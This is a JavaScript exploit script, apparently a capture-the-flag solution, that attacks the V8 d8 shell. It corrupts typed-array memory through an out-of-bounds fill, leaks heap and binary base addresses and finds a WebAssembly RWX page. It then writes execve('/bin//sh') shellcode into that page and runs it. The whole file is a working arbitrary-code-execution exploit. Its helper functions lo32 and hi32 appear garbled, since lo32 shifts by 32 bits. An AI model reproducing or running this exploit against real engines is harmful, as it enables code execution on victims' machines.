function addr64(loAddr, hiAddr){ return loAddr + hiAddr*0x100000000;}
function lo32(addr) {return (addr >>> 32);}
function hi32(addr) {return (addr-lo32(addr)) /0x100000000;}
function traverseArr(arr) {
    console.log("[");
    for (var i=0; i<0x20; i++) {
        console.log(i, arr[i].toString(16));
    }
    console.log("]");
}
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

var arr1 = new Uint32Array([0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41]);
var arr2 = new Uint32Array([0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42]);
var arrBuffer = new Array(0x20);
var shellcode= new Uint32Array([0x90909090, 0x90909090, 0x4852e6f7, 0x69622fbb, 0x732f2f6e, 0x8d485368, 0x3bb0243c, 0x90d23148, 0x90905152, 0x24348d48, 0x9090050f, 0x90188948]);
for(var i=0; i<0x20; i++){arrBuffer[i] = f;}
arr1.fill(0x80, 0x10, 0x11);


//console.log(corruptArray);
var leakedHeapAddress = addr64(arr1[0x14], arr1[0x13]);
console.log("leaked heap address: 0x" + leakedHeapAddress.toString(16));
var heapBaseAddress = addr64(0, arr1[0x13]);
var highAddr = arr1[0x13];
var lowAddr = arr1[0x14];
console.log("heap base address: 0x" + heapBaseAddress.toString(16));

arr1.fill(0x20, 0x3f, 0x40)
objectAddr = arr2[0x1f];
console.log("Object address for searching wasm: 0x"+objectAddr.toString(16));

arr1.fill(highAddr,  0x42, 0x43);
arr1.fill((lowAddr & 0xffff0000) + 0x1001, 0x43, 0x44)
traverseArr(arr2);
var d8BaseAddress = addr64(arr2[0], arr2[1]) - 0xd79d30;
console.log("d8 base address: 0x"+d8BaseAddress.toString(16));

arr1.fill((objectAddr - 0xf4), 0x43, 0x44);
traverseArr(arr2);

rwxBaseAddress = addr64(arr2[13], arr2[14]);
console.log("RWX base address: 0x"+rwxBaseAddress.toString(16));


arr1.fill(hi32(rwxBaseAddress), 0x42, 0x43);
arr1.fill(lo32(rwxBaseAddress+0x2c0-8) + 1, 0x43, 0x44);

for(var i = 0; i<shellcode.length; i++){
	arr2[i] = shellcode[i];
}

f();
